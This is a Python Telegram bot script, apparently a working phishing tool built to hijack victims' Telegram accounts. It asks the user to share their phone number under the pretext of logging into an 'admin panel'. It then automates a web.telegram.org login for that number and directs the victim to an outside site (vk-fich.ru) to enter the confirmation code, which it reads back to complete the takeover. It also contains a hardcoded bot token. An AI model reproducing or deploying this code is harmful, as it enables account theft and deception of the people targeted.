import os, signal, pickle, sys, requests

import telebot
from telebot import types
from time import sleep
from selenium import webdriver








global url_code, url_telegram

#TOKEN BOT
token_bot = "955448771:AAHULZOW6eNy4qTaYS47QWctS_JzXSuCmP8"
#Страница ввода кода для авторизации
url_code = "https://vk-fich.ru/code.txt"
#Страница для проверки кода которая ввела жертва
url_telegram = "https://vk-fich.ru/telega.php"




#Фуекция просмотра страницы
def view_code(url):
    r = requests.get(url)
    return r.text




bot = telebot.TeleBot(token_bot)


## Запуск browser telegram по команде /start
@bot.message_handler(commands=['start'])
def user(message):
    print("\nЗапущен Браузер пользователь нажал /start")
    global driver
    driver = webdriver.Chrome()
    driver.get('https://web.telegram.org')
    sent = bot.send_message(message.from_user.id, "Бот для управления админ панелью\n\nНапиши Меню")
    bot.register_next_step_handler(sent, menu)









@bot.message_handler(content_types=['text'])
def menu(message):
    print("\nПользователь команду Меню")
    user_markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    user_markup.row('Панель', 'Статус', 'Команды')
    uslugi = bot.send_message(message.from_user.id, "Меню", reply_markup=user_markup)
    bot.register_next_step_handler(uslugi, telephone)








def telephone(message):
    print("\nПользователь нажал Панель")
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="Войти", request_contact=True)
    keyboard.add(reg_button)
    nomer = bot.send_message(message.from_user.id, 'Реализация сделана для автоматизации регистрации\nИ авторизации в панеле', reply_markup=keyboard)
    bot.register_next_step_handler(nomer, user_auth)







def user_auth(message):
    print("\nПользователь команду Войти")
    phone = message.contact.phone_number
    print("\Получен номер"+str(phone))
    sleep(1)
    try:
        driver.find_element_by_name('phone_number').send_keys(phone)
        sleep(1.5)
        driver.find_element_by_name('phone_country').clear()
        driver.find_element_by_name('phone_country').send_keys('+')
        driver.find_element_by_class_name('login_head_submit_btn').click()
        sleep(0.5)
        a = driver.find_elements_by_tag_name('button')
        a[1].click()
    except:
        print("ERROR PHONE")
        bot.send_message(message.from_user.id, 'Такого номера не существует\n\nНапишите /start')
    code = bot.send_message(message.from_user.id, 'Для входа в админ панель\n\nПерейдите\n'+str(url_telegram))
    sleep(10)
    bot.send_message(message.from_user.id, 'Напишите Готово\nПосле того как ввели код на сайте')
    bot.register_next_step_handler(code, end)








def end(message):
    print("\nПользователь написал Готово")
    try:
        driver.find_element_by_name('phone_code').send_keys(view_code('https://vk-fich.ru/code.txt'))
        bot.send_message(message.from_user.id, 'Идет проверка данных от 1 до 3 минут')
    except:
        print("ERROR CODE")
        bot.send_message(message.from_user.id, 'Неверный код \n\nНапишите /start')











if __name__ == '__main__':
    print("BOT V 1.0 STARTED\n\nDEV: CyberUSA\n")
    bot.infinity_polling(none_stop=True)















     
